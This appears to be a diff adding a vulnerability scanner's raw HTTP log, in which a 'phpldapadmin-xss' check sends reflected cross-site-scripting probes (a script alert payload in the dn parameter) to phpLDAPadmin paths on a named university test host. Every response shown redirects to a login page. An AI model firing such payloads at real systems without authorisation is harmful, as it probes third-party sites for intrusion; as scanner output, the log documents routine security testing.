@@ -1,0 +1,216 @@
+[phpldapadmin-xss] Dumped HTTP request for https://paintrainer-uat.app.unimelb.edu.au//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET //cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: paintrainer-uat.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://paintrainer-uat.app.unimelb.edu.au//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:07 GMT
+Location: https://paintrainer-uat.app.unimelb.edu.au/login-to-paintrainer/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Powered-By: PHP/7.4.3
+X-Redirect-By: WordPress
+Content-Length: 0
+
+
+[phpldapadmin-xss] Dumped HTTP request for https://paintrainer-uat.app.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: paintrainer-uat.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://paintrainer-uat.app.unimelb.edu.au
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:07 GMT
+Location: https://paintrainer-uat.app.unimelb.edu.au/login-to-paintrainer/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Powered-By: PHP/7.4.3
+X-Redirect-By: WordPress
+Content-Length: 0
+
+
+[phpldapadmin-xss] Dumped HTTP request for https://paintrainer-uat.app.unimelb.edu.au//index.php?redirect=true&meth=ajax
+
+
+GET //index.php?redirect=true&meth=ajax HTTP/1.1
+Host: paintrainer-uat.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://paintrainer-uat.app.unimelb.edu.au//index.php?redirect=true&meth=ajax
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:07 GMT
+Location: https://paintrainer-uat.app.unimelb.edu.au/login-to-paintrainer/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Powered-By: PHP/7.4.3
+X-Redirect-By: WordPress
+Content-Length: 0
+
+
+[phpldapadmin-xss] Dumped HTTP request for https://paintrainer-uat.app.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET /htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: paintrainer-uat.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://paintrainer-uat.app.unimelb.edu.au/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:07 GMT
+Location: https://paintrainer-uat.app.unimelb.edu.au/login-to-paintrainer/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Powered-By: PHP/7.4.3
+X-Redirect-By: WordPress
+Content-Length: 0
+
+
+[phpldapadmin-xss] Dumped HTTP request for https://paintrainer-uat.app.unimelb.edu.au/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+
+GET /phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1 HTTP/1.1
+Host: paintrainer-uat.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://paintrainer-uat.app.unimelb.edu.au/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:07 GMT
+Location: https://paintrainer-uat.app.unimelb.edu.au/login-to-paintrainer/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Powered-By: PHP/7.4.3
+X-Redirect-By: WordPress
+Content-Length: 0
+
+
+[phpldapadmin-xss] Dumped HTTP request for https://paintrainer-uat.app.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+
+
+GET /htdocs/index.php/index.php?redirect=true&meth=ajax HTTP/1.1
+Host: paintrainer-uat.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://paintrainer-uat.app.unimelb.edu.au/htdocs/index.php/index.php?redirect=true&meth=ajax
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:07 GMT
+Location: https://paintrainer-uat.app.unimelb.edu.au/login-to-paintrainer/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Powered-By: PHP/7.4.3
+X-Redirect-By: WordPress
+Content-Length: 0
+
+
+[phpldapadmin-xss] Dumped HTTP request for https://paintrainer-uat.app.unimelb.edu.au/phpldapadmin/index.php?redirect=true&meth=ajax
+
+
+GET /phpldapadmin/index.php?redirect=true&meth=ajax HTTP/1.1
+Host: paintrainer-uat.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://paintrainer-uat.app.unimelb.edu.au/phpldapadmin/index.php?redirect=true&meth=ajax
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:07 GMT
+Location: https://paintrainer-uat.app.unimelb.edu.au/login-to-paintrainer/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Powered-By: PHP/7.4.3
+X-Redirect-By: WordPress
+Content-Length: 0
+
+
+[phpldapadmin-xss] Dumped HTTP request for https://paintrainer-uat.app.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: paintrainer-uat.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://paintrainer-uat.app.unimelb.edu.au
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:08 GMT
+Location: https://paintrainer-uat.app.unimelb.edu.au/login-to-paintrainer/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Powered-By: PHP/7.4.3
+X-Redirect-By: WordPress
+Content-Length: 0
+
+
+[phpldapadmin-xss] Dumped HTTP request for https://paintrainer-uat.app.unimelb.edu.au
+
+
+GET / HTTP/1.1
+Host: paintrainer-uat.app.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[phpldapadmin-xss] Dumped HTTP response https://paintrainer-uat.app.unimelb.edu.au
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:18:09 GMT
+Location: https://paintrainer-uat.app.unimelb.edu.au/login-to-paintrainer/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Powered-By: PHP/7.4.3
+X-Redirect-By: WordPress
+Content-Length: 0
+
+
